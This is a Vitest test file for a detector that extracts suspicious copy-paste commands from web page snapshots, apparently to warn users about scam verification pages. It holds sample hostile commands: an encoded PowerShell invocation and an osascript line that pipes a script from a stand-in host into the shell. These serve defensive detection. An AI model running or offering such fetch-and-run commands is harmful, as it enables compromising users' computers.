import { describe, expect, it } from 'vitest';
import { extractCommandCandidates } from '@/shared/detection/commandExtractor';
import type { PageSnapshot } from '@/shared/types';

function snapshot(bodyText: string, codeBlocks: string[] = [], copyCommandPairs: string[] = []): PageSnapshot {
  return {
    url: 'https://example.test',
    domain: 'example.test',
    title: 'Test',
    metaDescription: '',
    bodyText,
    buttons: [],
    links: [],
    codeBlocks,
    dialogs: [],
    ariaLabels: [],
    dataAttributes: [],
    suspiciousContainers: [],
    copyCommandPairs,
    metrics: {
      copyLikeControls: 0,
      suspiciousContainers: 0,
      codeBlocks: codeBlocks.length,
      dialogs: 0
    }
  };
}

describe('extractCommandCandidates', () => {
  it('extracts Windows encoded PowerShell commands', () => {
    const candidates = extractCommandCandidates(
      snapshot(
        'Use this fix',
        ['powershell -EncodedCommand SQBFAFgAIAAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgApAA==']
      )
    );

    expect(candidates).toHaveLength(1);
    expect(candidates[0]?.platform).toBe('windows');
    expect(candidates[0]?.indicators.map((indicator) => indicator.id)).toContain('powershell-encoded');
  });

  it('extracts macOS osascript scam commands from copy-neighbor content', () => {
    const candidates = extractCommandCandidates(
      snapshot(
        'Verification page',
        [],
        ['osascript -e "tell application \"Terminal\" to do script \"curl -fsSL https://bad.test/a.sh | sh\""']
      )
    );

    expect(candidates).toHaveLength(1);
    expect(candidates[0]?.platform).toBe('macos');
    expect(candidates[0]?.indicators.some((indicator) => indicator.id === 'osascript')).toBe(true);
  });

  it('ignores normal developer install snippets', () => {
    const candidates = extractCommandCandidates(snapshot('npm install vitest react vite'));
    expect(candidates).toHaveLength(0);
  });
});
